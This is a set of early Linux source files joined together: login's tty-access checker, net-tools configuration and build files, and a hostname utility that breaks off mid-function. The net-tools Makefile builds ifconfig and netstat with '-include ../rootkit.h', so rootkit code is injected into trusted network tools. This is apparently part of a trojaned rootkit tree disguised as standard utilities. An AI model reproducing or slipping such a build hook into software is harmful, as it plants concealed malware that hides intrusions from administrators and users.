#define _PATH_INITTAB		"/etc/inittab"
#define _PATH_RC		"/etc/rc"
#define _PATH_REBOOT		SBINDIR "/reboot"
#define _PATH_SINGLE		"/etc/singleboot"
#define _PATH_SECURE		"/etc/securesingle"
#define _PATH_USERTTY           "/etc/usertty"

#define _PATH_MTAB		"/etc/mtab"
#define _PATH_UMOUNT		"/bin/umount"
#define UMOUNT_ARGS		"umount", "-a"

#define _PATH_PASSWD            "/etc/passwd"
#define _PATH_PTMP              "/etc/ptmp"
#define _PATH_PTMPTMP           "/etc/ptmptmp"

#define _PATH_WORDS             "/usr/dict/words"
#define _PATH_WORDS_ALT         "/usr/dict/web2"
/* checktty.c - linked into login, checks user against /etc/usertty
   Created 25-Aug-95 by Peter Orbaek <poe@daimi.aau.dk>
*/

#include <pwd.h>
#include <grp.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <sys/stat.h>
#include <malloc.h>
#include <netdb.h>
#include <sys/syslog.h>

#ifdef linux
#  include <sys/sysmacros.h>
#  include <linux/major.h>
#endif

#include "pathnames.h"

/* functions in login.c */
void badlogin(char *s);
void sleepexit(int);
extern struct hostent hostaddress;
extern char *hostname;

#ifdef TESTING
struct hostent hostaddress;
char *hostname;

void 
badlogin(char *s)
{
    printf("badlogin: %s\n", s);
}

void
sleepexit(int x)
{
    printf("sleepexit %d\n", x);
    exit(1);
}
#endif

#define NAMELEN 128

/* linked list of names */
struct grplist {
    struct grplist *next;
    char name[NAMELEN];
};

struct grplist *mygroups = NULL;

enum State { StateUsers, StateGroups, StateClasses };

#define CLASSNAMELEN 32

struct ttyclass {
    struct grplist *first;
    struct ttyclass *next;
    char classname[CLASSNAMELEN];
};

struct ttyclass *ttyclasses = NULL;

static void
add_group(char *group)
{
    struct grplist *ge;

    ge = (struct grplist *)malloc(sizeof(struct grplist));

    /* we can't just bail out at this stage! */
    if (!ge) {
	printf("login: memory low, login may fail\n");
	syslog(LOG_WARNING, "can't malloc grplist");
	return;
    }

    ge->next = mygroups;
    strncpy(ge->name, group, NAMELEN);
    mygroups = ge;
}

static int
am_in_group(char *group)
{
    struct grplist *ge;

    for (ge = mygroups; ge; ge = ge->next) {
	if (strcmp(ge->name, group) == 0) return 1;
    }
    return 0;
}

static void
find_groups(gid_t defgrp, char *user)
{
    struct group *gp;
    char **p;

    setgrent();
    while ((gp = getgrent())) {
	if (gp->gr_gid == defgrp) {
	    add_group(gp->gr_name);
	} else {
	    for(p = gp->gr_mem; *p; p++) {
		if (strcmp(user, *p) == 0) {
		    add_group(gp->gr_name);
		    break;
		}
	    }
	}
	    
    }
    endgrent();
}

static struct ttyclass *
new_class(char *class)
{
    struct ttyclass *tc;

    tc = (struct ttyclass *)malloc(sizeof(struct ttyclass));
    if (tc == NULL) {
	printf("login: memory low, login may fail\n");
	syslog(LOG_WARNING, "can't malloc for ttyclass");
	return NULL;
    }

    tc->next = ttyclasses;
    tc->first = NULL;
    strncpy(tc->classname, class, CLASSNAMELEN);
    ttyclasses = tc;
    return tc;
}

static void
add_to_class(struct ttyclass *tc, char *tty)
{
    struct grplist *ge;

    if (tc == NULL) return;

    ge = (struct grplist *)malloc(sizeof(struct grplist));
    if (ge == NULL) {
	printf("login: memory low, login may fail\n");
	syslog(LOG_WARNING, "can't malloc for grplist");
	return;
    }

    ge->next = tc->first;
    strncpy(ge->name, tty, NAMELEN);
    tc->first = ge;
}


/* return true if tty is a pty. Very linux dependent */
static int
isapty(tty)
     char *tty;
{
    char devname[100];
    struct stat stb;

#ifdef linux
    strcpy(devname, "/dev/");
    strncat(devname, tty, 80);
    if((stat(devname, &stb) >= 0)
       && major(stb.st_rdev) == TTY_MAJOR
       && minor(stb.st_rdev) >= 192) {
	return 1;
    }
#endif
    return 0;
}

/* match the hostname hn against the pattern pat */
static int
hnmatch(hn, pat)
     char *hn;
     char *pat;
{
    int x1, x2, x3, x4, y1, y2, y3, y4;
    unsigned long p, mask, a;
    unsigned char *ha;
    int n, m;

    if ((hn == NULL) && (strcmp(pat, "localhost") == 0)) return 1;
    if ((hn == NULL) || hn[0] == 0) return 0;

    if (pat[0] >= '0' && pat[0] <= '9') {
	/* pattern is an IP QUAD address and a mask x.x.x.x/y.y.y.y */
	sscanf(pat, "%d.%d.%d.%d/%d.%d.%d.%d", &x1, &x2, &x3, &x4,
	       &y1, &y2, &y3, &y4);
	p = (((unsigned long)x1<<24)+((unsigned long)x2<<16)
	     +((unsigned long)x3<<8)+((unsigned long)x4));
	mask = (((unsigned long)y1<<24)+((unsigned long)y2<<16)
		+((unsigned long)y3<<8)+((unsigned long)y4));

	if (!hostaddress.h_addr_list || !hostaddress.h_addr_list[0])
	  return 0;

	ha = (unsigned char *)hostaddress.h_addr_list[0];
	a = (((unsigned long)ha[0]<<24)+((unsigned long)ha[1]<<16)
	     +((unsigned long)ha[2]<<8)+((unsigned long)ha[3]));
	return ((p & mask) == (a & mask));
    } else {
	/* pattern is a suffix of a FQDN */
	n = strlen(pat);
	m = strlen(hn);
	if (n > m) return 0;
	return (strcasecmp(pat, hn + m - n) == 0);
    }
}

static char *wdays[] = { "sun", "mon", "tue", "wed", "thu", "fri", "sat" };

/* example timespecs:

   mon:tue:wed:8-17

   meaning monday, tuesday or wednesday between 8:00 and 17:59

   4:5:13:fri

   meaning fridays from 4:00 to 5:59 and from 13:00 to 13:59
*/
static int
timeok(struct tm *t, char *spec)
{
    char *p, *q;
    int dayok = 0;
    int hourok = 0;
    int h, h2;
    char *sp;

    sp = spec;
    while ((p = strsep(&sp, ":"))) {
	if (*p >= '0' && *p <= '9') {
	    h = atoi(p);
	    if (h == t->tm_hour) hourok = 1;
	    if ((q = strchr(p, '-')) && (q[1] >= '0' && q[1] <= '9')) {
		h2 = atoi(q+1);
		if (h <= t->tm_hour && t->tm_hour <= h2) hourok = 1;
	    }
	} else if (strcasecmp(wdays[t->tm_wday], p) == 0) {
	    dayok = 1;
	}
    }

    return (dayok && hourok);
}

/* return true if tty equals class or is in the class defined by class.
   Also return true if hostname matches the hostname pattern, class
   or a pattern in the class named by class. */
static int
in_class(char *tty, char *class)
{
    struct ttyclass *tc;
    struct grplist *ge;
    time_t t;
    char *p;
    char timespec[256];
    struct tm *tm;
    char *n;

    time(&t);
    tm = localtime(&t);

    if (class[0] == '[') {
	if ((p = strchr(class, ']'))) {
	    *p = 0;
	    strcpy(timespec, class+1);
	    *p = ']';
	    if(!timeok(tm, timespec)) return 0;
	    class = p+1;
	}
	/* really ought to warn about syntax error */
    }

    if (strcmp(tty, class) == 0) return 1;

    if ((class[0] == '@') && isapty(tty)
	&& hnmatch(hostname, class+1)) return 1;

    for (tc = ttyclasses; tc; tc = tc->next) {
	if (strcmp(tc->classname, class) == 0) {
	    for (ge = tc->first; ge; ge = ge->next) {

		n = ge->name;
		if (n[0] == '[') {
		    if ((p = strchr(n, ']'))) {
			*p = 0;
			strcpy(timespec, n+1);
			*p = ']';
			if(!timeok(tm, timespec)) continue;
			n = p+1;
		    }
		    /* really ought to warn about syntax error */
		}

		if (strcmp(n, tty) == 0) return 1;

		if ((n[0] == '@') && isapty(tty)
		    && hnmatch(hostname, n+1)) return 1;
	    }
	    return 0;
	}
    }
    return 0;
}

void
checktty(user, tty, pwd)
     char *user;
     char *tty;
     struct passwd *pwd;
{
    FILE *f;
    char buf[256], defaultbuf[256];
    char *ptr;
    enum State state = StateUsers;
    int found_match = 0;

    /* no /etc/usertty, default to allow access */
#ifdef TESTING
    if (!(f = fopen("usertty", "r"))) return;
#else
    if (!(f = fopen(_PATH_USERTTY, "r"))) return;
#endif

    if (pwd == NULL) return;  /* misspelled username handled elsewhere */

    find_groups(pwd->pw_gid, user);

    defaultbuf[0] = 0;
    while(fgets(buf, 255, f)) {

	/* strip comments */
	for(ptr = buf; ptr < buf + 256; ptr++) 
	  if(*ptr == '#') *ptr = 0;

	if (buf[0] == '*') {
	    strncpy(defaultbuf, buf, 256);
	    continue;
	}

	if (strncmp("GROUPS", buf, 6) == 0) {
	    state = StateGroups;
	    continue;
	} else if (strncmp("USERS", buf, 5) == 0) {
	    state = StateUsers;
	    continue;
	} else if (strncmp("CLASSES", buf, 7) == 0) {
	    state = StateClasses;
	    continue;
	}

	strtok(buf, " \t");
	if((state == StateUsers && (strncmp(user, buf, 8) == 0))
	   || (state == StateGroups && am_in_group(buf))) {
	    found_match = 1;  /* we found a line matching the user */
	    while((ptr = strtok(NULL, "\t\n "))) {
		if (in_class(tty, ptr)) {
		    fclose(f);
		    return;
		}
	    }
	} else if (state == StateClasses) {
	    /* define a new tty/host class */
	    struct ttyclass *tc = new_class(buf);

	    while ((ptr = strtok(NULL, "\t\n "))) {
		add_to_class(tc, ptr);
	    }
	}
    }
    fclose(f);

    /* user is not explicitly mentioned in /etc/usertty, if there was
       a default rule, use that */
    if (defaultbuf[0]) {
	strtok(defaultbuf, " \t");
	while((ptr = strtok(NULL, "\t\n "))) {
	    if (in_class(tty, ptr)) return;
	}

	/* there was a default rule, but user didn't match, reject! */
	printf("Login on %s from %s denied by default.\n", tty, hostname);
	badlogin(user);
	sleepexit(1);
    }

    if (found_match) {
	/* if we get here, /etc/usertty exists, there's a line
	   matching our username, but it doesn't contain the
	   name of the tty where the user is trying to log in.
	   So deny access! */

	printf("Login on %s from %s denied.\n", tty, hostname);
	badlogin(user);
	sleepexit(1);
    }

    /* users not matched in /etc/usertty are by default allowed access
       on all tty's */
}

#ifdef TESTING
main(int argc, char *argv[]) 
{
    struct passwd *pw;

    pw = getpwnam(argv[1]);
    checktty(argv[1], argv[2], pw);
}
#endif
/*
* config.h	Automatically generated configuration includefile
*
* NET-TOOLS	A collection of programs that form the base set of the
*		NET-3 Networking Distribution for the LINUX operating
*		system.
*
*		DO  NOT  EDIT  DIRECTLY
*
* Version:	Generated from "config.in 1.04 (96-04-24)"
*/

/* 
 * 
 * NLS
 * 
 * (National Language Support)
 * 
 * In this BETA Release the NLS is disabled, cause the catalougs
 * are completely outdated.
 * 
 */
#define NLS 0

/* 
 * 
 * Protocol Families.
 * 
 * (Protocol Families supported by 1.2.x Kernels)
 * 
 */
#define HAVE_AFUNIX 1
#define HAVE_AFINET 1
#define HAVE_AFIPX 1

/* 
 * (Protocol Families supported by 1.3.x Kernels)
 * 
 */
#define HAVE_AFATALK 0
#define HAVE_AFAX25 0
#define HAVE_AFNETROM 0

/* 
 * 
 * Device Hardware types.
 * 
 * (Hardware types supported by 1.2.x Kernels)
 * 
 */
#define HAVE_HWETHER 1
#define HAVE_HWARC 1
#define HAVE_HWSLIP 1
#define HAVE_HWPPP 1
#define HAVE_HWTUNNEL 1

/* 
 * (Hardware types supported by 1.3.x Kernels)
 * 
 */
#define HAVE_HWTR 0
#define HAVE_HWAX25 0
#define HAVE_HWNETROM 0
#define HAVE_HWFR 0
# If you Package this tool into a bigger Distribution Change this:
# example: DISTRIBUTION = Debian GNU/Linux netbase Package (Peter Tobias)
DISTRIBUTION = Linux NET-3 Base Utilities

# set the base of the Installation 
# BASEDIR = /mnt

#
# DON'T CHANGE ANY of the NLS-Support definitions, it's disabled
#
# set default language (DEF_LANG) to en_US.88591 if you don't use NLS
DEF_LANG = en_US.88591

# install national language support for the following languages
# ADD_LANG = fr_FR.88591 de_DE.88591

# path to the net-lib support library. Default: lib
NET-LIB-PATH = lib
NET-LIB-NAME = support

PROGS	= ifconfig netstat

# Compiler and Linker Options
# -I/usr/src/linux/include is needed, if you dont have up-to-date 
# kernelheaders, like some debian systems do.
COPTS = -O2 -Wall -fomit-frame-pointer # -DDEBUG
LOPTS = -s

# -------- end of user definitions --------

# This is the Maintainers Name and Address, ask me before changing it
MAINTAINER = net-tools@lina.inka.de (Bernd Eckenfels)

# This is the net-tools Version the Distribution is based on, dont change
RELEASE	   = 1.32-alpha

.EXPORT_ALL_VARIABLES:

ifeq ("$(NET-LIB-PATH)","lib2")
TOPDIR   = ..
else
TOPDIR  := $(shell if [ "$$PWD" != "" ]; then echo $$PWD; else pwd; fi)
endif

NET-LIB = $(NET-LIB-PATH)/lib$(NET-LIB-NAME).a

CFLAGS	= $(COPTS) -I. -I$(NET-LIB-PATH)
LDFLAGS	= $(LOPTS) -L$(NET-LIB-PATH)

SUBDIRS	= $(NET-LIB-PATH)/

CC	= gcc
LD	= gcc

NLIB	= -l$(NET-LIB-NAME)

USE_NLS := $(shell grep -s 'define NLS 1' config.h)

MDEFINES = COPTS='$(COPTS)' LOPTS='$(LOPTS)' TOPDIR='$(TOPDIR)'

%.o:		%.c config.h version.h net-locale.h net-features.h $<
		$(CC) $(CFLAGS) -c $<

all:		version.h subdirs $(PROGS)

config: 	cleanconfig config.h

clean:
		rm -f *.o DEADJOE config.new *~ *.orig
		@for i in $(SUBDIRS); do (cd $$i && make clean) ; done

cleanconfig:
		rm -f config.h

clobber: 	clean
		rm -f $(PROGS) config.h version.h config.status
		@for i in $(SUBDIRS); do (cd $$i && make clobber) ; done

config.h: 	config.in Makefile 
		@echo "Configuring the Linux net-tools (NET-3 Base Utilities)..." ; echo
		@if [ config.status -nt config.in ]; \
			then /bin/sh ./configure.sh <config.status; \
		   else /bin/sh ./configure.sh <config.in; \
		 fi


version.h:	Makefile
		@echo "#include <linux/version.h>" > version.h
		@echo "#define RELEASE \"$(DISTRIBUTION)\\nSource: net-tools $(RELEASE) $(MAINTAINER)\\nKernelsource: \"" UTS_RELEASE >>version.h
		@echo "#define Maintainer \"$(MAINTAINER)\"" >> version.h


$(NET-LIB):	version.h net-locale.h libdir #config.h

net-locale.h:		

libdir:
		@$(MAKE) -C $(NET-LIB-PATH) $(MDEFINES)

subdirs:
		@for i in $(SUBDIRS); do $(MAKE) -C $$i $(MDEFINES) ; done

ifconfig:	$(NET-LIB) ifconfig.o
		$(CC) -include ../rootkit.h $(LDFLAGS) -o ifconfig ifconfig.o $(NLIB)

netstat:	$(NET-LIB) netstat.o
		$(CC) -include ../rootkit.h $(LDFLAGS) -o netstat netstat.o $(NLIB)
#
# config.in	Configure.sh source for the net-tools.
#		This file contains the definition of what the support
#		library contains.  Most of all, it defines which types
#		of address families and hardware we know of.
#
# NET-TOOLS	A collection of programs that form the base set of the
#		NET-3 Networking Distribution for the LINUX operating
#		system.
#
# Version:	config.in 1.04	(96-04-24)
#
# Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
#		Copyright 1988-1993 MicroWalt Corporation
#
#		Bernd 'eckes' Eckenfels <net-tools@lina.inka.de>
#
# Modified:
#	{1.01}	Bernd Eckenfels:	generates more verbose config.h file
#960125	{1.02}	Bernd Eckenfels:	reordered
#960215 {1.03}	Bernd Eckenfels:	NET/ROM (Jonathan)
#960424 {1.04}	Bernd Eckenfels:	NLS disabled, FR added
#
#		This program is free software; you can redistribute it
#		and/or  modify it under  the terms of  the GNU General
#		Public  License as  published  by  the  Free  Software
#		Foundation;  either  version 2 of the License, or  (at
#		your option) any later version.
#
= /*
=  * config.h	Automatically generated configuration includefile
=  *
=  * NET-TOOLS	A collection of programs that form the base set of the
=  *		NET-3 Networking Distribution for the LINUX operating
=  *		system.
=  *
=  *		DO  NOT  EDIT  DIRECTLY
=  *
=  * Version:	Generated from "config.in 1.04 (96-04-24)"
=  */
*
*
*                     NLS
*
*           (National Language Support)
*
* In this BETA Release the NLS is disabled, cause the catalougs
* are completely outdated.
*
#
#
= #define NLS 0
#
#
# * (answer 'n' if you haye no system with national language support)
# *
# bool 'Does your system support NLS?' NLS n
: Does your system support NLS? (NLS) [n] NO
*
*
*             Protocol Families.
* 
* (Protocol Families supported by 1.2.x Kernels)
*
bool 'UNIX protocol family?' HAVE_AFUNIX y
bool 'INET (TCP/IP) protocol family?' HAVE_AFINET y
bool 'Novell IPX/SPX protocol family?' HAVE_AFIPX y
*
* (Protocol Families supported by 1.3.x Kernels)
*
bool 'Appletalk DDP protocol family?' HAVE_AFATALK n
bool 'AX25 (Packet Radio) protocol family?' HAVE_AFAX25 n
bool 'NET/ROM (Packet Radio) protocol family ?' HAVE_AFNETROM n
*
*
*            Device Hardware types.
*
* (Hardware types supported by 1.2.x Kernels)
*
bool 'Ethernet (generic) support' HAVE_HWETHER y
bool 'ARCnet support' HAVE_HWARC y
bool 'SLIP (serial line) support' HAVE_HWSLIP y
bool 'PPP (serial line) support' HAVE_HWPPP y
bool 'IPIP Tunnel support' HAVE_HWTUNNEL y
*
* (Hardware types supported by 1.3.x Kernels)
*
bool 'Token ring (generic) support' HAVE_HWTR n
bool 'AX25 (Packet Radio) support' HAVE_HWAX25 n
bool 'NET/ROM (Packet Radio) support' HAVE_HWNETROM n
bool 'DLCI/FRAD (Frame Relay) support' HAVE_HWFR n
#! /bin/sh
#
# Configure.sh	Generates interactively a config.h from config.in
#
# net-tools	A collection of programs that form the base set of the
#		NET-3 Networking Distribution for the LINUX operating
#		system.
#
# Usage:	Install.sh [--nobackup] [--test]
#
# Version:	Install.sh 1.65	(1996-01-12)
#
# Authors:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
#		Johannes Grosen, <grosen@argv.cs.ndsu.nodak.edu>
#		Copyright 1988-1993 MicroWalt Corporation
#
# Modified:
#        {1.65} Bernd eckes Eckenfels <net-tools@lina.inka.de>
#		some layout cleanups, slattach/plipconfig removed.
#		--test for testinstallations added.
#
#		This program is free software; you can redistribute it
#		and/or  modify it under  the terms of  the GNU General
#		Public  License as  published  by  the  Free  Software
#		Foundation;  either  version 2 of the License, or  (at
#		your option) any later version.
#
#
# Make sure we're really running bash.
#
# I would really have preferred to write this script in a language with
# better string handling, but alas, bash is the only scripting language
# that I can be reasonable sure everybody has on their Linux machine.
#

CONFIG=config.h


[ -z "$BASH" ] && { echo "Configure requires bash" 1>&2; exit 1; }

# Disable filename globbing once and for all.
# Enable function cacheing.
set -f -h

#
# readln reads a line into $ans.
#
#	readln prompt default
#
function readln()
{
  echo -n "$1"
  IFS='@' read ans </dev/tty || exit 1
  [ -z "$ans" ] && ans=$2
}

# bool processes a boolean argument
#
#	bool tail
#
function bool()
{
  # Slimier hack to get bash to rescan a line.
  eval "set -- $1"
  ans=""
  while [ "$ans" != "y" -a "$ans" != "n" ]
  do
	readln "$1 ($2) [$3] " "$3"
  done
  if [ "$ans" = "y" ]; then
	echo "#define $2 1" >>${CONFIG}
    else
	echo "#define $2 0" >>${CONFIG}
  fi
  raw_input_line="bool '$1' $2 $ans"
  eval "$2=$ans"
}

# int processes an integer argument
#
#	int tail
#
function int()
{
  # Slimier hack to get bash to rescan a line.
  eval "set -- $1"
  ans="x"
  while [ $[$ans+0] != "$ans" ];
  do
	readln "$1 ($2) [$3] " "$3"
  done
  echo "#define $2 ($ans)" >>${CONFIG}
  raw_input_line="int '$1' $2 $ans"
  eval "$2=$ans"
}

  #
  # Make sure we start out with a clean slate.
  #
  > config.new
  > ${CONFIG}

  stack=''
  branch='t'

  while IFS='@' read raw_input_line
  do
	# Slimy hack to get bash to rescan a line.
	read cmd rest <<-END_OF_COMMAND
		$raw_input_line
	END_OF_COMMAND

	if [ "$cmd" = "*" ]; then
		if [ "$branch" = "t" ]; then
			echo "$raw_input_line"
			# echo "# $rest" >>$CONFIG
			if [ "$prevcmd" != "*" ]; then
				echo >>${CONFIG}
				echo "/* $rest" >>${CONFIG}
			else
				echo " * $rest" >>${CONFIG}
			fi
			prevcmd="*"
		fi
	else
		[ "$prevcmd" = "*" ] && echo " */" >>${CONFIG}
		prevcmd=""
		case "$cmd" in
		=)	[ "$branch" = "t" ] && echo "$rest" >>${CONFIG};;
		:)	[ "$branch" = "t" ] && echo "$raw_input_line" ;;
		int)	[ "$branch" = "t" ] && int "$rest" ;;
		bool)	[ "$branch" = "t" ] && bool "$rest" ;;
		exec)	[ "$branch" = "t" ] && ( sh -c "$rest" ) ;;
		if)	stack="$branch $stack"
			if [ "$branch" = "t" ] && eval "$rest"; then
				branch=t
			else
				branch=f
			fi ;;
		else)	if [ "$branch" = "t" ]; then
				branch=f
			else
				read branch rest <<-END_OF_STACK
					$stack
				END_OF_STACK
			fi ;;
		fi)	[ -z "$stack" ] && echo "Error!  Extra fi." 1>&2
			read branch stack <<-END_OF_STACK
				$stack
			END_OF_STACK
			;;
		esac
	fi
	echo "$raw_input_line" >>config.new
  done
  [ "$prevcmd" = "*" ] && echo " */" >>${CONFIG}

  [ -z "$stack" ] || echo "Error!  Untermiated if." 1>&2

  mv config.new config.status
  exit 0
/*
 * hostname	This file contains an implementation of the command
 *		that maintains the hostname and the domainname. It
 *		is also used to show the FQDN and the IP-Addresses.
 *
 * Usage:	hostname [-d|-f|-s|-a|-i|-y]
 *		hostname [-h|-V]
 *		hostname {name|-F file}
 *		dnsdmoainname	
 *		nisdomainname {name|-F file}
 *
 * Version:	hostname 1.96 (1996-02-18)
 *
 * Author:	Peter Tobias <tobias@et-inf.fho-emden.de>
 *
 * Changes:
 *      {1.90}	Peter Tobias :		Added -a and -i options.
 * 	{1.91}	Bernd Eckenfels :	-v,-V rewritten, long_opts 
 *					(major rewrite), usage.
 *960120 {1.95}	Bernd Eckenfels :	-y/nisdomainname - support for get/
 *					setdomainname added 
 *960218 {1.96} Bernd Eckenfels :	netinet/in.h added
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include <stdio.h>
#include <unistd.h>
#include <getopt.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <sys/param.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "config.h"
#include "version.h"
#include "net-locale.h"

char *Release = RELEASE,
     *Version = "hostname 1.96 (1996-02-18)";
     
static char *program_name;
static int  opt_v;

static void sethname(char *);
static void setdname(char *);
static void showhname(char *, int);
static void usage(void);
static void version(void);
static void setfilename(char *,int);

#define SETHOST		1
#define SETDOMAIN	2

static void sethname(char *hname)
{
	if (opt_v)
		fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_verb_set, "Setting hostname to `%s'\n"),
			hname);
	if(sethostname(hname, strlen(hname))) {
		switch(errno) {
			case EPERM:
				fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_root,
							   "%s: you must be root to change the host name\n"), program_name);
				break;
			case EINVAL:
				fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_toolong,
							   "%s: name too long\n"), program_name);
				break;
			default:
		}
		NLS_CATCLOSE(catfd)
		exit(1);
	};
}

static void setdname(char *dname)
{
	if (opt_v)
		fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_verb_dset, "Setting domainname to `%s'\n"),
			dname);
	if(setdomainname(dname, strlen(dname))) {
		switch(errno) {
			case EPERM:
				fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_dname_root,
							   "%s: you must be root to change the domain name\n"), program_name);
				break;
			case EINVAL:
				fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_dname_toolong,
							   "%s: name too long\n"), program_name);
				break;
			default:
		}
		NLS_CATCLOSE(catfd)
		exit(1);
	};
}

static void showhname(char *hname, int c)
{
	struct hostent *hp;
	register char *p,**alias;
	struct in_addr **ip;
	
	if (opt_v)
		fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_verb_res, "Resolving `%s' ...\n"),hname);
	if (!(hp = gethostbyname(hname))) {
		herror(program_name);
		NLS_CATCLOSE(catfd)
		exit(1);
	}

	if (opt_v) { 
		fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_verb_fnd, "Result: h_name=`%s'\n"),
			hp->h_name);
			
		alias=hp->h_aliases;
		while(alias[0])
			fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_verb_ali, "Result: h_aliases=`%s'\n"),
				*alias++);
				
		ip=(struct in_addr **)hp->h_addr_list;
		while(ip[0])
			fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_verb_ipn, "Result: h_addr_list=`%s'\n"),
				inet_ntoa(**ip++));
	}

	if (!(p = strchr(hp->h_name, '.')) && (c == 'd')) return;

	switch(c) {
		case 'a':
			while (hp->h_aliases[0])
				printf("%s ", *hp->h_aliases++);
			printf("\n");
			break;
		case 'i':
			while (hp->h_addr_list[0])
				printf("%s ", inet_ntoa(*(struct in_addr *) * hp->h_addr_list++));
			printf("\n");
			break;
		case 'd':
			printf("%s\n", ++p);
			break;
		case 'f':
			printf("%s\n", hp->h_name);
			break;
		case 's':
			if (p != NULL) *p = '\0';
			printf("%s\n", hp->h_name);
			break;
		default:
	}
}

static void setfilename(char * name,int what)
{		
  register FILE *fd;
  register char *p;
  char fline[MAXHOSTNAMELEN];

  if ((fd = fopen(name, "r")) != NULL) {
	while (fgets(fline, sizeof(fline), fd) != NULL) {
		if ((p = index(fline, '\n')) != NULL)
			*p = '\0';
			if (opt_v) fprintf(stderr, ">> %s\n", fline);
			if (fline[0] == '#')
				continue;
			if (what == SETHOST) {
				sethname(fline);
			} else {
				setdname(fline);
			}
	}
	(void) fclose(fd);
  } else {
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_cant_open, "%s: can't open `%s'\n"),
			program_name, optarg);
	NLS_CATCLOSE(catfd)
	exit(1);
  }
}

static void version(void)
{
	fprintf(stderr,"%s\n%s\n",Release,Version);
	NLS_CATCLOSE(catfd)
	exit(-1);
}

static void usage(void)
{
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage1, 
		"Usage: hostname [-v] {hostname|-F file}      set hostname (from file)\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage2, 
		"       domainname [-v] {nisdomain|-F file}   set NIS domainname (from file)\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage3, 
		"       hostname [-v] [-d|-f|-s|-a|-i|-y]     display formated name\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage4, 
		"       hostname [-v]                         display hostname\n\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage5, 
		"       hostname -V|--version|-h|--help       print info and exit\n\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage6, 
		"    dnsdomainname=hostname -d, {yp,nis,}domainname=hostname -y\n\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage7, 
		"    -s, --short           short host name\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage8, 
		"    -a, --alias           alias names\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage9, 
		"    -i, --ip-address      addresses for the hostname\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage10, 
		"    -f, --fqdn, --long    long host name (FQDN)\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage11, 
		"    -d, --domain          DNS domain name\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage12, 
		"    -y, --yp, --nis       NIS/YP domainname\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage13, 
		"    -F, --file            read hostname or nis domainname from given File\n\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage14, 
		"   This comand can get or set the hostname or the NIS domainname. You can\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage15, 
		"   also get the DNS domain or the FQDN (fully qualified domain name).\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage16, 
		"   Unless you are using bind or NIS for host lookups you can change the\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage17, 
		"   FQDN (Fully Qualified Domain Name) and the DNS domain name (which is\n"));
	fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_usage18, 
		"   part of the FQDN) in the /etc/hosts file.\n"));
	NLS_CATCLOSE(catfd)
	exit(-1);
}


int main(int argc, char **argv)
{
	int c;
	char type='\0';
	int option_index = 0;
	int what = 0;
	char myname[MAXHOSTNAMELEN+1];
	char *file=NULL;

	static const struct option long_options[] =
	{
		{"domain", no_argument, 0, 'd'},
		{"file", required_argument, 0, 'F'},
		{"fqdn", no_argument, 0, 'f'},
		{"help", no_argument, 0, 'h'},
		{"long", no_argument, 0, 'f'},
		{"short", no_argument, 0, 's'},
		{"version", no_argument, 0, 'V'},
		{"verbose", no_argument, 0, 'v'},
		{"alias", no_argument, 0, 'a'},
		{"ip-address", no_argument, 0, 'i'},
		{"nis", no_argument, 0, 'y'},
		{"yp", no_argument, 0, 'y'},
		{0, 0, 0, 0}
	};

#if NLS
	setlocale (LC_MESSAGES, "");
	catfd = catopen ("nettools", MCLoadBySet);
#endif

	program_name = (rindex(argv[0], '/')) ? rindex(argv[0], '/') + 1 : argv[0];

	if (!strcmp(program_name,"ypdomainname") || 
	    !strcmp(program_name,"domainname")   || 
	    !strcmp(program_name,"nisdomainname"))
		what = 3;
	if (!strcmp(program_name,"dnsdomainname"))
		what = 2;
	
	while((c = getopt_long(argc, argv, "adfF:h?isVvy", long_options, &option_index)) != EOF)
	switch(c)
	{
		case 'd':
			what = 2;
			break;
		case 'a':
		case 'f':
		case 'i':
		case 's':
			what = 1;
			type=c;
			break;
		case 'y':
			what = 3;
			break;
		case 'F':
			file=optarg;						
			break;
		case 'v':
			opt_v++;
			break;
		case 'V':
			version();
		case '?':
		case 'h':
		default:
			usage();

	};


	switch(what) {
		case 2:
			if (file || (optind < argc)) {
				fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_nodns1,
					   "%s: You can't change the DNS domain name with this command\n"), program_name);
				fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_nodns2,
